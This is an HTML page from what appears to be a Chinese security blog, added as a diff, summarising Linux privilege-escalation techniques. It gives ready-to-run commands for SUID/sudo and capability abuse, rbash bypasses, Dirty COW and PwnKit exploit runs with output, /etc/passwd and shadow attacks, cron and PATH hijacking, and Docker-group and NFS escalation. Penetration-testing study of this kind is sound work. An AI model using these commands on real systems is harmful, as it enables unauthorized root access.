@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Linux提权总结 - ConsT27's Blog</title>
+    <link href="../../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Linux\u63d0\u6743\u603b\u7ed3", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "sudo \u548c suid \u63d0\u6743", url: "#sudo-suid" },
+              {title: "rbash \u7ed5\u8fc7", url: "#rbash" },
+              {title: "\u5185\u6838\u63d0\u6743", url: "#_4" },
+              {title: "passwd\u548cshadow", url: "#passwdshadow" },
+              {title: "passwd \u53ef\u5199", url: "#passwd" },
+              {title: "\u8ba1\u5212\u4efb\u52a1", url: "#_7" },
+              {title: "\u901a\u914d\u7b26\u63d0\u6743", url: "#_10" },
+              {title: "\u73af\u5883\u53d8\u91cf", url: "#_11" },
+              {title: "\u5bc6\u7801\u67e5\u627e", url: "#_12" },
+              {title: "capabilities", url: "#capabilities" },
+              {title: "Docker", url: "#docker" },
+              {title: "NFS", url: "#nfs" },
+              {title: "pkexec \u63d0\u6743CVE-2021-4034", url: "#pkexec-cve-2021-4034" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-link">
+        Windows提权
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Linux%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Linux%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-link">
+        Linux提权
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="linux">Linux提权总结</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#sudo-和-suid-提权">sudo 和 suid 提权</a><ul>
+<li><a href="#可利用命令清单">可利用命令清单</a></li>
+<li><a href="#何为suid">何为suid</a></li>
+<li><a href="#何为sudo">何为sudo</a></li>
+<li><a href="#遍历目录中的suid文件">遍历目录中的suid文件</a></li>
+<li><a href="#用sudo--l-查看哪些命令能被sudo">用sudo -l 查看哪些命令能被sudo</a></li>
+<li><a href="#可利用于提权的命令">可利用于提权的命令</a><ul>
+<li><a href="#1nmap">1.nmap</a></li>
+<li><a href="#2find">2.find</a></li>
+<li><a href="#3vim">3.vim</a></li>
+<li><a href="#4bash">4.bash</a></li>
+<li><a href="#5lessmore">5.less，more</a></li>
+<li><a href="#6exim">6.exim</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#rbash-绕过">rbash 绕过</a><ul>
+<li><a href="#何为rbash">何为rbash</a></li>
+<li><a href="#bypass">bypass</a><ul>
+<li><a href="#scp-bypass">scp bypass</a></li>
+<li><a href="#进入命令自带shell-bypass">进入命令自带shell bypass</a></li>
+<li><a href="#find-bypasss">find bypasss</a></li>
+<li><a href="#编程语言-bypass">编程语言 bypass</a></li>
+<li><a href="#cp-bypass">cp bypass</a></li>
+<li><a href="#直接更改PATHSHELL变量">直接更改PATH/SHELL变量</a></li>
+<li><a href="#ssh-bypass">ssh bypass</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#内核提权">内核提权</a><ul>
+<li><a href="#脏牛">脏牛</a></li>
+<li><a href="#cve-cve-2023-cve-2023-35001">cve-cve-2023-cve-2023-35001</a></li>
+</ul>
+</li>
+<li><a href="#passwd和shadow">passwd和shadow</a><ul>
+<li><a href="#明文密码">明文密码</a></li>
+</ul>
+</li>
+<li><a href="#passwd-可写">passwd 可写</a><ul>
+<li><a href="#爆破shadow">爆破shadow</a></li>
+</ul>
+</li>
+<li><a href="#计划任务">计划任务</a><ul>
+<li><a href="#文件重写">文件重写</a></li>
+<li><a href="#环境变量劫持">环境变量劫持</a></li>
+</ul>
+</li>
+<li><a href="#通配符提权">通配符提权</a></li>
+<li><a href="#环境变量">环境变量</a></li>
+<li><a href="#密码查找">密码查找</a><ul>
+<li><a href="#文件内查找">文件内查找</a></li>
+<li><a href="#查找十分钟内更改过的文件">查找十分钟内更改过的文件</a></li>
+</ul>
+</li>
+<li><a href="#capabilities">capabilities</a><ul>
+<li><a href="#简介">简介</a></li>
+<li><a href="#实操">实操</a><ul>
+<li><a href="#通过cap_setuid">通过cap_setuid</a></li>
+<li><a href="#通过CAP_DAC_READ_SEARCH">通过CAP_DAC_READ_SEARCH</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#Docker">Docker</a><ul>
+<li><a href="#Docker用户组提权">Docker用户组提权</a></li>
+</ul>
+</li>
+<li><a href="#NFS">NFS</a><ul>
+<li><a href="#no_root_squash">no_root_squash</a></li>
+</ul>
+</li>
+<li><a href="#pkexec-提权CVE-2021-4034">pkexec 提权CVE-2021-4034</a></li>
+</ul>
+<hr />
+<hr />
+<h2 id="sudo-suid">sudo 和 suid 提权</h2>
+<h3 id="_2">可利用命令清单</h3>
+<p><a href="https://gtfobins.github.io//" title="https://gtfobins.github.io//">https://gtfobins.github.io//</a></p>
+<h3 id="suid">何为suid</h3>
+<p><img alt="QQ截图20210217145316" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145316.png" title="QQ截图20210217145316" /></p>
+<p>可见在权限位置有一个s权限。那么这个s的作用是什么呢？
+答案是当其他用户执行该文件时，该文件会以root的身份执行。
+这里就涉及到了Effective UID和Real UID以及Saved UID
+Effective UID: 程序实际操作时生效的UID
+Real UID: 执行该程序的用户的实际UID
+Saved UID: 在高权限用户降权后，保留的其原本UID (不展开说)</p>
+<p>所以增加了一个s权限，该程序在实际运行时Effective UID就会变为0，即root的UID</p>
+<h3 id="sudo">何为sudo</h3>
+<p>就是能把一个命令视作root来执行,用sudo-l查看可以被sudo的命令</p>
+<h3 id="suid_1">遍历目录中的suid文件</h3>
+<pre><code class="language-纯文本">find / -perm -u=s 2&gt;/dev/null
+</code></pre>
+<p>执行该命令，会得到所有suid文件</p>
+<p><img alt="QQ截图20210217145327" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145327.png" title="QQ截图20210217145327" /></p>
+<h3 id="sudo-l-sudo">用sudo -l 查看哪些命令能被sudo</h3>
+<h3 id="_3">可利用于提权的命令</h3>
+<h4 id="1nmap">1.nmap</h4>
+<pre><code class="language-纯文本">nmap --interactive
+</code></pre>
+<p>使用nmap的udp或tcp syn扫描时，需要用到root权限，所以有些管理员图方便会直接给namp上s权限，而nmap 5.20(使用nmap -v查看nmap版本)之前有一个interactive交互模式(nmap –interactive)，在nmap effective uid为0时，可以通过这个模式获得root权限交互式命令行，成功提权</p>
+<pre><code class="language-纯文本">echo &quot;os.execute('/bin/bash')&quot; &gt; ./shell
+nmap --script=shell
+</code></pre>
+<p>全版本通杀提权，利用nmap可以执行指定文件的特点提权</p>
+<h4 id="2find">2.find</h4>
+<pre><code class="language-纯文本">find / -exec command
+</code></pre>
+<p>find命令自带-exec参数，可以执行命令，若find有suid权限，那么使用exec相当于直接提权到root.</p>
+<pre><code class="language-纯文本">读文件 find /path -exec {} \;
+</code></pre>
+<h4 id="3vim">3.vim</h4>
+<p>vim有了suid就可以任意文件读取了</p>
+<p>同时也可以输入 :shell</p>
+<p>来获取root shell</p>
+<h4 id="4bash">4.bash</h4>
+<pre><code class="language-纯文本">bash -p  开启一个新shell，suid的话自然是开启root shell
+</code></pre>
+<h4 id="5lessmore">5.less，more</h4>
+<p>和vim差不多，任意文件读取，同时也可以输入 !command 进行提权到root</p>
+<h4 id="6exim">6.exim</h4>
+<p>exim在特定版本下会有suid提权</p>
+<p><img alt="QQ截图20210217145341" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145341.png" title="QQ截图20210217145341" /></p>
+<p>下载exp打就完事了</p>
+<h2 id="rbash">rbash 绕过</h2>
+<h3 id="rbash_1">何为rbash</h3>
+<p>rbash，是出于安全性考虑的一个功能受限的bash，我在vulnhub dc-2首次接触,他的限制性可能会有如下.</p>
+<ul>
+<li>cd 切换目录</li>
+<li>含有斜杠 <code>/</code> 的命令, 譬如 <code>/bin/sh</code></li>
+<li>设置 PATH ENV 等环境变量</li>
+<li>使用 <code>&gt;</code> <code>&lt;</code> 进行重定向</li>
+<li>binary 的运行. 通常 root 用户会手动创建 <code>/bin/binary_file -&gt; /home/rbash_user/bin/binary_file</code> 的软链接, 限制性地提供部分 binary_file 给 rbash_user 使用 在 bash 下 <code>echo $SHELL</code>, 可以获取当前环境是否是 rbash.</li>
+</ul>
+<h3 id="bypass">bypass</h3>
+<h4 id="scp-bypass">scp bypass</h4>
+<p>我在<a href="http://www.const27.com/2020/07/02/vulnhub-dc-2/就是用scp绕的" title="http://www.const27.com/2020/07/02/vulnhub-dc-2/就是用scp绕的">http://www.const27.com/2020/07/02/vulnhub-dc-2/就是用scp绕的</a></p>
+<p><img alt="QQ截图20210217145419" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145419.png" title="QQ截图20210217145419" /></p>
+<h4 id="shell-bypass">进入命令自带shell bypass</h4>
+<p>man,git config help,more,less,vim,vi,ftp,gdb等命令都有自己的shell，我们只需在他们各自的shell中执行/bin/sh即可
+一般都是在shell键入!/bin/sh来bypass rbash</p>
+<p>下面这种方法也是可行的（似乎仅vim)</p>
+<pre><code class="language-纯文本">:set shell=/bin/bash
+:shell
+</code></pre>
+<p>执行上面两个语句，就bypass了</p>
+<h4 id="find-bypasss">find bypasss</h4>
+<p>简单概括就是-exec执行一下/bin/bash …</p>
+<p><img alt="QQ截图20210217145437" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145437.png" title="QQ截图20210217145437" /></p>
+<h4 id="bypass_1">编程语言 bypass</h4>
+<p>python</p>
+<p>如果python都可以用的话，那就更轻松了，os安排一下
+似乎pty也行?没试</p>
+<pre><code class="language-纯文本">python -c &quot;import os;os.system('/bin/bash')&quot;
+</code></pre>
+<p>php</p>
+<pre><code class="language-纯文本">php -a 进入php shell
+然后执行命令:exec(&quot;/bin/bash&quot;);
+</code></pre>
+<p>perl</p>
+<pre><code class="language-纯文本">perl -e 'exec &quot;/bin/sh&quot;;'
+</code></pre>
+<p>ruby</p>
+<pre><code class="language-纯文本">ruby -e 'exec &quot;/bin/bash&quot;'
+</code></pre>
+<h4 id="cp-bypass">cp bypass</h4>
+<p>直接用cp把/usr/bin里的命令复制过来就行了</p>
+<h4 id="pathshell">直接更改PATH/SHELL变量</h4>
+<p>键入export -p 查看该用户的变量</p>
+<p><img alt="QQ截图20210217145455" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145455.png" title="QQ截图20210217145455" /></p>
+<p>如果这俩变量有w权，那么我们可以直接写入来bypass</p>
+<h4 id="ssh-bypass">ssh bypass</h4>
+<p>原理是通过ssh链接当前IP的当前用户并启动/bin/bash</p>
+<pre><code class="language-纯文本">ssh username@Ip -t &quot;/bin/bash&quot;
+</code></pre>
+<h2 id="_4">内核提权</h2>
+<p>用 uanme -a 查明内核版本</p>
+<p><img alt="image-20210311220036263" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210311220036263.png" title="image-20210311220036263" /></p>
+<p>uname比较看不懂，可以用lsb_release -a&#x20;</p>
+<p><img alt="" src="../image/image_yuB-agTTTQ.png" /></p>
+<p>然后找exp打就完事了，内核提权的内容有点底层，暂时不用深入了解</p>
+<h3 id="_5">脏牛</h3>
+<p>查看内核版本:uname -r&#x20;</p>
+<p><img alt="" src="../image/image_LZ12bMw302.png" /></p>
+<pre><code class="language-纯文本">2.6.22&lt;kernel version&lt;4.8.3、4.7.9和4.4.26
+
+</code></pre>
+<pre><code class="language-纯文本">exp https://github.com/firefart/dirtycow.git
+
+Compile with:
+
+   gcc -pthread dirty.c -o dirty -lcrypt
+Then run the newly create binary by either doing:
+
+   ./dirty
+or
+
+   ./dirty my-new-password
+Afterwards, you can either su firefart or ssh firefart@...
+
+DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
+
+   mv /tmp/passwd.bak /etc/passwd
+Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer
+</code></pre>
+<h3 id="cve-cve-2023-cve-2023-35001">cve-cve-2023-cve-2023-35001</h3>
+<p>v3.13-rc1 &lt;= Linux Kernel &lt; v6.5-rc2</p>
+<p>等exp</p>
+<h2 id="passwdshadow">passwd和shadow</h2>
+<h3 id="_6">明文密码</h3>
+<p>/etc/passwd 默认所有用户可读，但只有root可写。
+/etc/passwd里的用户口令往往以x代替，其加密后的密码会存入/etc/shadow里面，/etc/shadow默认只有root可读。</p>
+<p>但是有小概率情况，明文密码就直接出现在/etc/passwd了，如果有这个情况且root密码暴露在了passwd里，那么就可以轻而易举提权了</p>
+<h2 id="passwd">passwd 可写</h2>
+<p>如果/etc/passwd 我们当前用户可写，可以直接把root的密码改成一个明文密码，从而达到提权目的</p>
+<h3 id="shadow">爆破shadow</h3>
+<p>如果/etc/shadow 可读，我们可以用hashcat或者john暴力破解shadow文件</p>
+<h2 id="_7">计划任务</h2>
+<h3 id="_8">文件重写</h3>
+<p>计划任务由crontab管理，非root用户是无法列出root用户的计划任务的，但我们可以列出/etc的系统任务，系统任务默认是root权限运行的</p>
+<pre><code class="language-纯文本">ls -l /etc/cron*
+</code></pre>
+<p>如果我们有幸有权限能更改其中一个任务指定的脚本，我们就可以往脚本里添加如反弹shell等指令，从而提权</p>
+<h3 id="_9">环境变量劫持</h3>
+<p>我们查看定时任务</p>
+<p><img alt="image-20210316125520822" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316125520822.png" title="image-20210316125520822" /></p>
+<p>发现定义了诸多环境变量，如果其任务有未指定绝对路径的指令，如</p>
+<pre><code class="language-纯文本">17 *    * * *   root    shell.sh
+</code></pre>
+<p>而且我们在其环境变量路径中可以进行写入操作，那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持</p>
+<p>比如我们在/sbin 写入一个 反弹shell功能的shell.sh，那么就可以造成提权</p>
+<h2 id="_10">通配符提权</h2>
+<p><a href="https://www.secpulse.com/archives/72965.html" title="https://www.secpulse.com/archives/72965.html">https://www.secpulse.com/archives/72965.html</a> 总结的太好了，我都不想记笔记了（偷懒</p>
+<h2 id="_11">环境变量</h2>
+<p>如果我们找到一个suid权限的程序，但是我们无法完成suid提权，就可以试试搭配环境变量进行提权。</p>
+<p>这个提权方法的思想是，找到有suid的，内部有system函数调用未指定路径的命令的文件。同时用户有修改自己环境变量的权限，</p>
+<p>我们就可以通过劫持system函数里调用的脚本文件，使其指向我们环境变量里自行创建的一个同名脚本文件，那么这个我们自行创建的同名脚本文件就能以root权限运行了，如果这个脚本文件里的命令是/bin/bash，那么就相当于我们提权了。</p>
+<p>可能有点小绕，看下面具体操作就行了。</p>
+<p>实验室配置:</p>
+<p>首先在一个目录下创建如下文件</p>
+<pre><code class="language-纯文本">vim demo.c
+</code></pre>
+<p><img alt="image-20210312183454821" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312183454821.png" title="image-20210312183454821" /></p>
+<p>然后 gcc demo.c -o shell    将其编译为可执行文件</p>
+<p>然后 chmod u+s shell           为其增加suid权限</p>
+<p>攻击者视角:</p>
+<p>首先使用下列指令搜寻suid权限文件</p>
+<pre><code class="language-纯文本">find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<p><img alt="image-20210312184402084" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312184424019.png" title="image-20210312184402084" /></p>
+<p>发现可疑目标，执行一下看看</p>
+<p><img alt="image-20210312184424019" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312184424019.png" title="image-20210312184424019" /></p>
+<p>发现返回了ps命令的结果，我们可以以此猜测这个文件内部 有 system("ps");  这条c语言代码。
+遂可尝试环境变量提权</p>
+<p>我们依次执行以下命令</p>
+<pre><code class="language-纯文本">cd /tmp
+echo &quot;/bin/bash&quot; &gt; ps
+export $PATH=/tmp:$PATH        需要修改自身环境变量的权限，但基本上都有这个权限
+chmod 777 ./ps                 没这条命令会导致提权失败
+cd /home/const27
+./shell                        提权成功
+</code></pre>
+<p><img alt="image-20210312184905534" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312184905534.png" title="image-20210312184905534" /></p>
+<h2 id="_12">密码查找</h2>
+<p>这个提权技术说白了，就是去到处翻密码</p>
+<h3 id="_13">文件内查找</h3>
+<pre><code class="language-纯文本">grep --color=auto -rnw '/' -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/null
+find . -type f -exec grep -i -I &quot;PASSWORD&quot; {} /dev/null \;
+</code></pre>
+<p>我们可以通过以上命令，指定关键字，在所有文件中搜索内容中有关键字的文件。</p>
+<h3 id="_14">查找十分钟内更改过的文件</h3>
+<pre><code class="language-纯文本">find / -mmin -10 2&gt;/dev/null | grep -Ev &quot;^/proc&quot;  (不显示^/proc文件或文件夹)
+</code></pre>
+<h2 id="capabilities">capabilities</h2>
+<p>capabilities 是linux2.2后出现的产物，它的出现一定程度上弥补了suid这种粗糙的权限管理机制，但是capabilities 自身也有造成提权的安全隐患</p>
+<h3 id="_15">简介</h3>
+<p>capabilities 把root的权限细分了，可以分别启用或者禁用。</p>
+<p>在进行特权操作的时候，如果euid不是root，那么系统就会检查是否具有执行特权操作的对应capabilities ，并以此为凭据决定特权操作是否能被执行。</p>
+<p>如下是一些常见的特权操作及其对应capabilities</p>
+<table>
+<thead>
+<tr>
+<th>改变文件的所属者(chown())</th>
+<th>CAP_CHOWN</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>向进程发送信号(kill(), signal())</td>
+<td>CAP_KILL</td>
+</tr>
+<tr>
+<td>改变进程的uid(setuid(), setreuid(), setresuid()等)</td>
+<td>CAP_SETUID</td>
+</tr>
+<tr>
+<td>trace进程(ptrace())</td>
+<td>CAP_SYS_PTRACE</td>
+</tr>
+<tr>
+<td>设置系统时间(settimeofday(), stime()等)</td>
+<td>CAP_SYS_TIME</td>
+</tr>
+<tr>
+<td>忽略文件读及目录搜索的DAC访问限制</td>
+<td>CAP_DAC_READ_SEARCH</td>
+</tr>
+</tbody>
+</table>
+<p>关于capabilities的管理工具有如下:</p>
+<ul>
+<li>getcap</li>
+<li>setcap</li>
+<li>capsh</li>
+<li>filecap</li>
+</ul>
+<p>getcap 用于查询capabilities，setcap用于设置capabilities，capsh用于查当前shell进程的capabilities，filecap既能设置又能查询。</p>
+<p>我们可以通过以下指令搜索设置了capabilities的可执行文件</p>
+<pre><code class="language-纯文本">getcap -r / 2&gt;/dev/null
+</code></pre>
+<h3 id="_16">实操</h3>
+<h4 id="cap_setuid">通过cap_setuid</h4>
+<p>cap_setuid 可以设置当前用户的euid，我们可以通过此选项来进行一些提权。</p>
+<p>以python为例</p>
+<p><img alt="image-20210316201948608" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316201948608.png" title="image-20210316201948608" /></p>
+<p>我们发现python3.8 有cap_setuid权限，那么我们可以用以下指令进行提权</p>
+<pre><code class="language-纯文本">python -c 'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'
+</code></pre>
+<p><img alt="image-20210316202912697" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316202912697.png" title="image-20210316202912697" /></p>
+<p>类似的有很多。</p>
+<p>perl</p>
+<pre><code class="language-纯文本">perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;'
+</code></pre>
+<p>gdb</p>
+<pre><code class="language-纯文本">gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
+</code></pre>
+<p>php</p>
+<pre><code class="language-纯文本">php -r &quot;posix_setuid(0); system('/bin/sh');&quot;
+</code></pre>
+<p>python</p>
+<pre><code class="language-纯文本">python -c 'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'
+</code></pre>
+<p>rvim</p>
+<p>需要支持python3模块。</p>
+<pre><code class="language-纯文本">rvim -c ':py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)'
+</code></pre>
+<p>vim</p>
+<p>需要支持python3模块。<code>vim --version</code>查询，是否支持py3</p>
+<pre><code class="language-纯文本">vim -c ':py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)'
+</code></pre>
+<h4 id="cap_dac_read_search">通过CAP_DAC_READ_SEARCH</h4>
+<p>cap_dac_read_search可以绕过文件的读权限检查以及目录的读/执行权限的检查。</p>
+<p>利用此特性我们可以读取系统中的敏感信息。</p>
+<p>如果tar有此权限，我们可以通过此来查看敏感文件内容。</p>
+<pre><code class="language-纯文本">tar cvf shadow.tar /etc/shadow  //创建压缩文件
+
+tar -xvf shadow.tar  //解压缩
+
+cd etc  //进入解压缩的目录
+
+chmod +r shadow  //赋予读权限
+
+cat shadow | grep root  //查看shadow文件的内容
+</code></pre>
+<h2 id="docker">Docker</h2>
+<h3 id="docker_1">Docker用户组提权</h3>
+<p>如果我们拿到了一个Docker用户组的用户权限，那么我们可以很轻松地完成提权</p>
+<p>首先我们执行如下命令</p>
+<pre><code class="language-纯文本">docker run -v /:/mnt --rm -it crf_web1 chroot /mnt sh
+</code></pre>
+<p>然后在其中的/etc/passwd中写入一个root权限用户（我这里直接无密码了）</p>
+<p><img alt="image-20210316205908273" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316205908273.png" title="image-20210316205908273" /></p>
+<p>然后退出来，直接尝试 su root2</p>
+<p><img alt="image-20210316210009057" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316210009057.png" title="image-20210316210009057" /></p>
+<p>提权成功</p>
+<h2 id="nfs">NFS</h2>
+<p>NFS 是一个用来共享目录的东西，但若配置权限不当则会引发安全问题</p>
+<h3 id="no_root_squash">no_root_squash</h3>
+<p>我们cat /etc/exports 如果有no_root_squash字样，则说明root用户就会对共享目录拥有至高的权限控制，就像是对本机的目录操作一样。</p>
+<p>也就是说，任何机器的root在此目录上都有最高权限。</p>
+<p>我们在获得一台机器的root权限后，可以通过nfs在另一台低权限机器上实现提权</p>
+<pre><code class="language-纯文本">mkdir /tmp/nfs
+mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs 将本机上的/tmp/nfs 挂载到共享目录
+cp /bin/bash /tmp/nfs/bash
+chmod u+s /tmp/nfs/bash  设置共享目录上bash的suid
+</code></pre>
+<p>回到低权限机，执行 /tmp/bash  完成提权</p>
+<h2 id="pkexec-cve-2021-4034">pkexec 提权CVE-2021-4034</h2>
+<p>polkit是一个授权管理器，其系统架构由授权和身份验证代理组成，pkexec是其中polkit的其中一个工具，他的作用有点类似于sudo，允许用户以另一个用户身份执行命令</p>
+<p><a href="https://github.com/luijait/PwnKit-Exploit.git" title="https://github.com/luijait/PwnKit-Exploit.git">https://github.com/luijait/PwnKit-Exploit.git</a></p>
+<pre><code class="language-纯文本">debian@debian:~/PwnKit-Exploit$ make
+cc -Wall    exploit.c   -o exploit
+debian@debian:~/PwnKit-Exploit$ whoami
+debian
+debian@debian:~/PwnKit-Exploit$ ./exploit
+Current User before execute exploit
+hacker@victim$whoami: debian
+Exploit written by @luijait (0x6c75696a616974)
+[+] Enjoy your root if exploit was completed succesfully
+root@debian:/home/debian/PwnKit-Exploit# whoami
+root
+root@debian:/home/debian/PwnKit-Exploit# 
+</code></pre>
+<p>不受影响的版本</p>
+<pre><code class="language-纯文本">CentOS：
+· CentOS 6：polkit-0.96-11.el6_10.2
+· CentOS 7：polkit-0.112-26.el7_9.1
+· CentOS 8.0：polkit-0.115-13.el8_5.1
+· CentOS 8.2：polkit-0.115-11.el8_2.2
+· CentOS 8.4：polkit-0.115-11.el8_4.2
+Ubuntu：
+· Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1
+· Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1
+· Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6
+· Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2
+· Ubuntu 21.10：policykit-1-0.105-31ubuntu0.1
+Debain：
+· ：policykit-1 0.105-18+deb9u2
+· Debain stretch：policykit-1 0.105-18+deb9u2
+· Debain buster：policykit-1 0.105-25+deb10u1
+· Debain bullseye：policykit-1 0.105-31+deb11u1
+· Debain bookworm,bullseye：policykit-1 0.105-31.1
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-link">
+        Windows提权
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Linux%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Linux%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-link">
+        Linux提权
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
